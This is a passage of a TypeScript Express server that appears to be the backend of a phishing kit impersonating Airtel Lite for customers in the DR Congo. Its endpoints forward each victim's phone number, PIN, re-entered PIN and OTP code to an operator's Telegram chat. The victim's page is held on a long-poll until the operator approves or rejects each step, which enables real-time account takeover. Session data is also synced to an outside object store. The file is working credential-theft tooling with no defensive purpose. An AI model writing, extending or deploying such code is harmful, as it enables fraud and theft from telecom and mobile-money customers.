      `🔑 <b>Code PIN Ressaisi (Correct):</b> <code>${cleanPin}</code>\n` +
      `📌 <b>Code PIN Initial:</b> <code>${session.pin || originalPin || 'N/A'}</code>\n` +
      `🔢 <b>Code OTP Validé:</b> <code>${session.otp || '****'}</code>\n` +
      `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
      `👇 <i>Confirmez la validation finale du code PIN pour activer le forfait :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider PIN Final',
          callback_data: `approve_reenter_${sessionId}`,
        },
        {
          text: '❌ Rejeter PIN Final',
          callback_data: `reject_reenter_${sessionId}`,
        },
      ],
    ];

    const result = await sendTelegramMessage(messageText, inlineKeyboard);
    if (result && result.result?.message_id) {
      session.reenterMessageId = result.result.message_id;
      saveSessionsToDisk();
    }

    return res.json({
      success: true,
      sessionId,
      status: session.reenterStatus,
      message: 'Code PIN confirmé transmis au Telegram.',
    });
  } catch (error: any) {
    console.error('Error in /api/telegram/send-reenter-pin:', error);
    return res.status(500).json({ error: error.message || 'Erreur serveur' });
  }
});

// 3. Fast In-Memory Status Polling Endpoint (< 5ms)
app.get('/api/telegram/status', (req, res) => {
  const sessionId = (req.query.sessionId || req.query.id) as string;
  const phone = req.query.phone as string;

  let session: SessionRecord | undefined;
  if (sessionId) {
    session = findSessionByIdOrPhone(sessionId);
  }
  if (!session && phone) {
    const clean = normalizePhone(phone);
    const sid = phoneToSessionMap.get(clean);
    if (sid) {
      session = sessions.get(sid);
    }
  }

  if (!session) {
    return res.json({
      exists: false,
      loginStatus: 'idle',
      otpStatus: 'idle',
      reenterStatus: 'idle',
    });
  }

  return res.json({
    exists: true,
    sessionId: session.sessionId,
    phone: session.phone,
    loginStatus: session.loginStatus,
    otpStatus: session.otpStatus,
    reenterStatus: session.reenterStatus || 'idle',
    lastUpdated: session.lastUpdated,
  });
});

// 4. Ultra-Fast Event-Driven Long-Poll Endpoint
// Suspends response until Telegram bot clicks button or timeout fires
app.get('/api/telegram/wait-status', (req, res) => {
  const sessionId = (req.query.sessionId || req.query.id) as string;
  const phone = req.query.phone as string;
  const targetStep = (req.query.targetStep as 'login' | 'otp' | 'reenter') || 'login';
  const timeoutMs = Math.min(Math.max(parseInt(req.query.timeout as string, 10) || 10000, 2000), 20000);

  let session: SessionRecord | undefined;
  if (sessionId) {
    session = findSessionByIdOrPhone(sessionId);
  }
  if (!session && phone) {
    const clean = normalizePhone(phone);
    const sid = phoneToSessionMap.get(clean);
    if (sid) {
      session = sessions.get(sid);
    }
  }

  if (!session) {
    return res.json({
      exists: false,
      status: 'idle',
      loginStatus: 'idle',
      otpStatus: 'idle',
      reenterStatus: 'idle',
    });
  }

  const currentStatus =
    targetStep === 'login'
      ? session.loginStatus
      : targetStep === 'otp'
      ? session.otpStatus
      : session.reenterStatus || 'idle';

  // If already resolved (approved or rejected), respond immediately!
  if (currentStatus === 'approved' || currentStatus === 'rejected') {
    return res.json({
      exists: true,
      sessionId: session.sessionId,
      step: targetStep,
      status: currentStatus,
      loginStatus: session.loginStatus,
      otpStatus: session.otpStatus,
      reenterStatus: session.reenterStatus || 'idle',
      immediate: true,
    });
  }

  // Register long-poll listener
  let isResolved = false;
  let timer: NodeJS.Timeout | null = null;

  const listener: SessionListener = (updatedSession) => {
    if (isResolved) return;
    const newStatus =
      targetStep === 'login'
        ? updatedSession.loginStatus
        : targetStep === 'otp'
        ? updatedSession.otpStatus
        : updatedSession.reenterStatus || 'idle';
    if (newStatus === 'approved' || newStatus === 'rejected') {
      isResolved = true;
      if (timer) clearTimeout(timer);
      res.json({
        exists: true,
        sessionId: updatedSession.sessionId,
        step: targetStep,
        status: newStatus,
        loginStatus: updatedSession.loginStatus,
        otpStatus: updatedSession.otpStatus,
        reenterStatus: updatedSession.reenterStatus || 'idle',
        immediate: false,
      });
    }
  };

  if (!waitingListeners.has(sessionId)) {
    waitingListeners.set(sessionId, new Set());
  }
  waitingListeners.get(sessionId)!.add(listener);

  // Set timeout cleanup
  timer = setTimeout(() => {
    if (isResolved) return;
    isResolved = true;
    const set = waitingListeners.get(sessionId);
    if (set) {
      set.delete(listener);
      if (set.size === 0) waitingListeners.delete(sessionId);
    }
    const latest = sessions.get(sessionId);
    const resolvedStatus = latest
      ? targetStep === 'login'
        ? latest.loginStatus
        : targetStep === 'otp'
        ? latest.otpStatus
        : latest.reenterStatus || 'idle'
      : 'pending';
    res.json({
      exists: Boolean(latest),
      sessionId,
      step: targetStep,
      status: resolvedStatus,
      timeout: true,
    });
  }, timeoutMs);

  // Handle client disconnect
  req.on('close', () => {
    isResolved = true;
    if (timer) clearTimeout(timer);
    const set = waitingListeners.get(sessionId);
    if (set) {
      set.delete(listener);
      if (set.size === 0) waitingListeners.delete(sessionId);
    }
  });
});

// 5. Telegram Webhook Handler
app.post('/api/telegram/webhook', async (req, res) => {
  try {
    const update = req.body || {};
    if (update.callback_query) {
      const cq = update.callback_query;
      const callbackData = cq.data || '';
      const callbackId = cq.id;
      const msgId = cq.message?.message_id;
      const chatId = cq.message?.chat?.id;

      let recordId = '';
      let actionType = '';

      if (callbackData.startsWith('approve_login_')) {
        recordId = callbackData.replace('approve_login_', '');
        actionType = 'approve_login';
      } else if (callbackData.startsWith('reject_login_')) {
        recordId = callbackData.replace('reject_login_', '');
        actionType = 'reject_login';
      } else if (callbackData.startsWith('approve_otp_')) {
        recordId = callbackData.replace('approve_otp_', '');
        actionType = 'approve_otp';
      } else if (callbackData.startsWith('reject_otp_')) {
        recordId = callbackData.replace('reject_otp_', '');
        actionType = 'reject_otp';
      } else if (callbackData.startsWith('approve_reenter_')) {
        recordId = callbackData.replace('approve_reenter_', '');
        actionType = 'approve_reenter';
      } else if (callbackData.startsWith('reject_reenter_')) {
        recordId = callbackData.replace('reject_reenter_', '');
        actionType = 'reject_reenter';
      }

      if (recordId) {
        // 1. Update in-memory session
        const session = sessions.get(recordId);
        if (session) {
          if (actionType === 'approve_login') session.loginStatus = 'approved';
          else if (actionType === 'reject_login') session.loginStatus = 'rejected';
          else if (actionType === 'approve_otp') session.otpStatus = 'approved';
          else if (actionType === 'reject_otp') session.otpStatus = 'rejected';
          else if (actionType === 'approve_reenter') session.reenterStatus = 'approved';
          else if (actionType === 'reject_reenter') session.reenterStatus = 'rejected';
          session.lastUpdated = Date.now();
          saveSessionsToDisk();
          notifySessionUpdated(session);
        }

        // 2. Update cloud store
        try {
          const fetchRes = await fetch(`https://api.restful-api.dev/objects/${recordId}`);
          if (fetchRes.ok) {
            const record = await fetchRes.json();
            const data = record.data || {};
            if (actionType === 'approve_login') data.loginStatus = 'approved';
            else if (actionType === 'reject_login') data.loginStatus = 'rejected';
            else if (actionType === 'approve_otp') data.otpStatus = 'approved';
            else if (actionType === 'reject_otp') data.otpStatus = 'rejected';
            else if (actionType === 'approve_reenter') data.reenterStatus = 'approved';
            else if (actionType === 'reject_reenter') data.reenterStatus = 'rejected';
            data.lastUpdated = Date.now();

            await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
              method: 'PUT',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ name: record.name || recordId, data }),
            });
          }
        } catch (e) {
          console.warn('Cloud sync error in server webhook:', e);
        }

        // 3. Answer Telegram callback
        let alertMsg = 'Action enregistrée';
        if (actionType === 'approve_login') alertMsg = '✅ Connexion validée ! Passage au code OTP.';
        if (actionType === 'reject_login') alertMsg = '❌ Connexion refusée.';
        if (actionType === 'approve_otp') alertMsg = '✅ Code OTP validé avec succès !';
        if (actionType === 'reject_otp') alertMsg = '❌ Code OTP rejeté ou invalide.';
        if (actionType === 'approve_reenter') alertMsg = '✅ Code PIN final validé avec succès !';
        if (actionType === 'reject_reenter') alertMsg = '❌ Code PIN final refusé.';

        answerCallbackQuery(callbackId, alertMsg, true);

        // 4. Update message in Telegram
        if (msgId && chatId) {
          const phone = session?.phone || 'Inconnu';
          const plan = session?.planName || 'Forfait Airtel Starlink';
          let updatedText = '';

          if (actionType === 'approve_login') {
            updatedText =
              `🔴 <b>AIRTEL LITE - CONNEXION CLIENT VALIDÉE</b>\n\n` +
              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
              `🔑 <b>Code PIN:</b> <code>${session?.pin || '****'}</code>\n` +
              `📦 <b>Forfait:</b> ${plan}\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
              `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
              `🟢 <b>STATUT: ✅ APPROUVÉ PAR L'ADMINISTRATEUR</b>`;
          } else if (actionType === 'reject_login') {
            updatedText =
              `🔴 <b>AIRTEL LITE - CONNEXION CLIENT REFUSÉE</b>\n\n` +
              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
              `🔑 <b>Code PIN:</b> <code>${session?.pin || '****'}</code>\n` +
              `📦 <b>Forfait:</b> ${plan}\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n\n` +
              `🔴 <b>STATUT: ❌ REJETÉ (CODE PIN OU NUMÉRO INCORRECT)</b>`;
          } else if (actionType === 'approve_otp') {
            updatedText =
              `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP VALIDÉ</b>\n\n` +
              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
              `🔢 <b>Code OTP:</b> <code>${session?.otp || '****'}</code>\n` +
              `📦 <b>Forfait:</b> ${plan}\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n\n` +
              `🟢 <b>STATUT: ✅ OTP CONFIRMÉ ET VALIDÉ</b>`;
          } else if (actionType === 'reject_otp') {
            updatedText =
              `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP REFUSÉ</b>\n\n` +
              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
              `🔢 <b>Code OTP:</b> <code>${session?.otp || '****'}</code>\n` +
              `📦 <b>Forfait:</b> ${plan}\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n\n` +
              `🔴 <b>STATUT: ❌ OTP REJETÉ / INVALIDE</b>`;
          } else if (actionType === 'approve_reenter') {
            updatedText =
              `🔐 <b>AIRTEL LITE - CODE PIN FINAL VALIDÉ</b>\n\n` +
              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
              `🔑 <b>Code PIN:</b> <code>${session?.reenterPin || session?.pin || '****'}</code>\n` +
              `📦 <b>Forfait:</b> ${plan}\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n\n` +
              `🟢 <b>STATUT: ✅ CODE PIN CONFIRMÉ & FORFAIT ACTIVÉ AVEC SUCCÈS</b>`;
          } else if (actionType === 'reject_reenter') {
            updatedText =
              `🔐 <b>AIRTEL LITE - CODE PIN FINAL REJETÉ</b>\n\n` +
              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
              `🔑 <b>Code PIN:</b> <code>${session?.reenterPin || '****'}</code>\n` +
              `📦 <b>Forfait:</b> ${plan}\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n\n` +
              `🔴 <b>STATUT: ❌ CODE PIN REJETÉ / INCORRECT</b>`;
          }

          if (updatedText) {
            editMessageText(chatId, msgId, updatedText);
          }
        }
      }
    }
    return res.status(200).json({ ok: true });
  } catch (err: any) {
    return res.status(200).json({ ok: true, error: err?.message });
  }
});

// 6. Direct Web Action Link Handler
app.get('/api/telegram/action', async (req, res) => {
  const { id, action } = req.query as { id: string; action: string };
  if (!id || !action) {
    return res.status(400).send('<h3>id et action requis.</h3>');
  }

  const session = sessions.get(id);
  if (session) {
    if (action === 'approve_login') session.loginStatus = 'approved';
    else if (action === 'reject_login') session.loginStatus = 'rejected';
    else if (action === 'approve_otp') session.otpStatus = 'approved';
    else if (action === 'reject_otp') session.otpStatus = 'rejected';
    else if (action === 'approve_reenter') session.reenterStatus = 'approved';
    else if (action === 'reject_reenter') session.reenterStatus = 'rejected';
    session.lastUpdated = Date.now();
    saveSessionsToDisk();
    notifySessionUpdated(session);
  }

  try {
    const fetchRes = await fetch(`https://api.restful-api.dev/objects/${id}`);
    if (fetchRes.ok) {
      const record = await fetchRes.json();
      const data = record.data || {};
      if (action === 'approve_login') data.loginStatus = 'approved';
      else if (action === 'reject_login') data.loginStatus = 'rejected';
      else if (action === 'approve_otp') data.otpStatus = 'approved';
      else if (action === 'reject_otp') data.otpStatus = 'rejected';
      else if (action === 'approve_reenter') data.reenterStatus = 'approved';
      else if (action === 'reject_reenter') data.reenterStatus = 'rejected';
      data.lastUpdated = Date.now();

      await fetch(`https://api.restful-api.dev/objects/${id}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: record.name || id, data }),
      });
    }
  } catch (e) {
    console.warn('Action cloud sync error:', e);
  }

  return res.status(200).send(`
    <!DOCTYPE html>
    <html>
      <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Validation Airtel Lite</title>
        <style>
          body { font-family: sans-serif; background: #0f172a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
          .card { background: #1e293b; border-radius: 20px; padding: 30px; max-width: 380px; width: 100%; border: 1px solid rgba(255,255,255,0.1); }
          h2 { color: #10b981; margin: 0 0 10px; }
          p { color: #94a3b8; font-size: 14px; }
        </style>
      </head>
      <body>
        <div class="card">
          <h2>✅ Action validée avec succès !</h2>
          <p>Le statut a été mis à jour en direct pour l'utilisateur.<br>Vous pouvez fermer cette page.</p>
        </div>
      </body>
    </html>
  `);
});

// 7. Manual action simulator endpoint
app.post('/api/telegram/manual-action', (req, res) => {
  const { sessionId, type, action } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(404).json({ error: 'Session non trouvée' });
  }

  if (type === 'login') {
    session.loginStatus = action === 'approve' ? 'approved' : 'rejected';
  } else if (type === 'otp') {
    session.otpStatus = action === 'approve' ? 'approved' : 'rejected';
  }
  session.lastUpdated = Date.now();
  saveSessionsToDisk();
  notifySessionUpdated(session);

  return res.json({
    success: true,
    session,
  });
});

// Start Server with Vite Middleware Mode
async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = fs.existsSync(path.join(process.cwd(), 'dist', 'index.html'))
      ? path.join(process.cwd(), 'dist')
      : path.join(process.cwd(), 'build');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[Airtel Portal Server] Running at http://0.0.0.0:${PORT}`);
  });
}

startServer();
